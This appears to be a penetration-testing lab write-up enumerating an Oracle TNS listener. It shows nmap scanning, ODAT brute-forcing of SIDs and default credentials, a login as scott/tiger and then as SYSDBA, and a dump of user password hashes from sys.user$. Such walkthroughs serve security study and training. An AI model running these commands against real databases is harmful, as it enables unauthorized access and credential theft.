# 🏴️ ORACLE TNS — Footprinting Study

---

## Enumeration

### 1. Oracle TNS Scan

Here I'm running an initial scan to identify the Oracle TNS service and its version.

```
sudo nmap -p1521 -sV 10.129.97.235 --open
```

**Output:**

```
Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-05-19 13:50 CDT
Nmap scan report for 10.129.97.235
Host is up (0.0073s latency).

PORT     STATE SERVICE    VERSION
1521/tcp open  oracle-tns Oracle TNS listener 11.2.0.2.0 (unauthorized)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 6.42 seconds
```

**Information collected:**
- Version: Oracle TNS listener 11.2.0.2.0
- Port: 1521/TCP

### 2. ODAT Enumeration - SIDs and Service Names

Now I'll use ODAT (Oracle Database Attacking Tool) to enumerate valid SIDs and service names.

```
./odat.py all -s 10.129.97.235
```

**Output:**

```
[+] Target: 10.129.97.235:1521 [all]
[+] Checking if target 10.129.97.235:1521 is well configured for a connection...
[+] According to a test, the TNS listener 10.129.97.235:1521 is well configured. Continue...

[1] (10.129.97.235:1521): Is it vulnerable to TNS poisoning (CVE-2012-1675)?
[+] Impossible to know if target is vulnerable to a remote TNS poisoning because SID is not given.

[2] (10.129.97.235:1521): Searching valid SIDs
[2.1] Searching valid SIDs thanks to a well known SID list on the 10.129.97.235:1521 server
[+] 'XE' is a valid SID. Continue...                                                                                          
100% |#######################################################################################################| Time: 00:00:12 
[2.2] Searching valid SIDs thanks to a brute-force attack on 1 chars now (10.129.97.235:1521)
100% |#######################################################################################################| Time: 00:00:00 
[2.3] Searching valid SIDs thanks to a brute-force attack on 2 chars now (10.129.97.235:1521)
[+] 'XE' is a valid SID. Continue...                                                                                          
100% |#######################################################################################################| Time: 00:00:11 
[+] SIDs found on the 10.129.97.235:1521 server: XE

[3] (10.129.97.235:1521): Searching valid Service Names
[3.1] Searching valid Service Names thanks to a well known Service Name list on the 10.129.97.235:1521 server
[+] 'XE' is a valid Service Name. Continue...                                                                                 
[+] 'XEXDB' is a valid Service Name. Continue...                                                                              
100% |#######################################################################################################| Time: 00:00:14
[+] Service Name(s) found on the 10.129.97.235:1521 server: XE,XEXDB
```

**Information collected:**
- Valid SID: XE
- Service Names: XE, XEXDB

### 3. ODAT Enumeration - Credentials

Continuing with ODAT to check default credentials.

```
./odat.py all -s 10.129.97.235
```

**Output:**

```
[4] (10.129.97.235:1521): Searching valid accounts on the XE SID
[!] Notice: 'ctxsys' account is locked, so skipping this username for password
[!] Notice: 'dbsnmp' account is locked, so skipping this username for password
...
[+] Valid credentials found: scott/tiger. Continue...
...
[+] Accounts found on 10.129.97.235:1521/sid:XE: 
scott/tiger
```

**Information collected:**
- Credentials found: scott/tiger

### 4. SQLPlus Connection

I found the credentials scott/tiger. Now I'll connect via sqlplus to the database using the credential I found earlier.

```
sqlplus scott/tiger@10.129.97.235/XE
```

**Output:**

```
SQL*Plus: Release 19.0.0.0.0 - Production on Tue May 19 14:06:55 2026
Version 19.6.0.0.0

Copyright (c) 1982, 2019, Oracle.  All rights reserved.

ERROR:
ORA-28002: the password will expire within 7 days

Connected to:
Oracle Database 11g Express Edition Release 11.2.0.2.0 - 64bit Production
```

**Information collected:**
- Connection established to the Oracle 11g XE database

### 5. Table Enumeration

Looking for available tables.

```
select table_name from all_tables;
```

**Output:**

```
TABLE_NAME
------------------------------
DUAL
SYSTEM_PRIVILEGE_MAP
TABLE_PRIVILEGE_MAP
...
DEPT
EMP
BONUS
SALGRADE
...

75 rows selected.
```

### 6. Permission Check

Checking what permissions the scott user has.

```
select * from user_role_privs;
```

**Output:**

```
USERNAME		       GRANTED_ROLE		      ADM DEF OS_
------------------------------ ------------------------------ --- --- ---
SCOTT			       CONNECT			      NO  YES NO
SCOTT			       RESOURCE 		      NO  YES NO
```

### 7. Connecting as SYSDBA

Since I didn't find anything, I'll try connecting to the database with the same credentials but as sysdba.

```
sqlplus scott/tiger@10.129.97.235/XE as sysdba
```

**Output:**

```
SQL*Plus: Release 19.0.0.0.0 - Production on Tue May 19 14:08:51 2026
Version 19.6.0.0.0

Connected to:
Oracle Database 11g Express Edition Release 11.2.0.2.0 - 64bit Production
```

### 8. Password Hash Enumeration

Looking for usernames and password hashes.

```
select name,password from sys.user$;
```

**Output:**

```
NAME			       PASSWORD
------------------------------ ------------------------------
SYS			       FBA343E7D6C8BC9D
...
SYSTEM			       B5073FE1DE351687
...
DBSNMP			       E066D214D5421CCC
...
CTXSYS			       D1D21CA56994CAB6
...
XDB			       E76A6BD999EF9FF1
...
SCOTT			       F894844C34402B67

51 rows selected.
```

**Information collected:**
- Password hash for user DBSNMP found: E066D214D5421CCC
- Several system users with hashes

---

## Summary

| Field | Value |
|:------|:------|
| **Version** | Oracle TNS listener 11.2.0.2.0 |
| **Port** | 1521/TCP |
| **Valid SID** | XE |
| **Service Names** | XE, XEXDB |
| **Credentials** | scott/tiger |
| **Users enumerated** | SYS, SYSTEM, DBSNMP, CTXSYS, XDB, SCOTT |
| **CVE** | CVE-2012-1675 (TNS poisoning) |
| **Tools** | nmap, ODAT, sqlplus |

---

## References

- [ODAT - Oracle Database Attacking Tool](https://github.com/0xdea/exploits/tree/master/systems/oracle)
- [Oracle TNS Listener Documentation](https://docs.oracle.com/database/121/NETRF/title.htm)
- [CVE-2012-1675](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2012-1675)
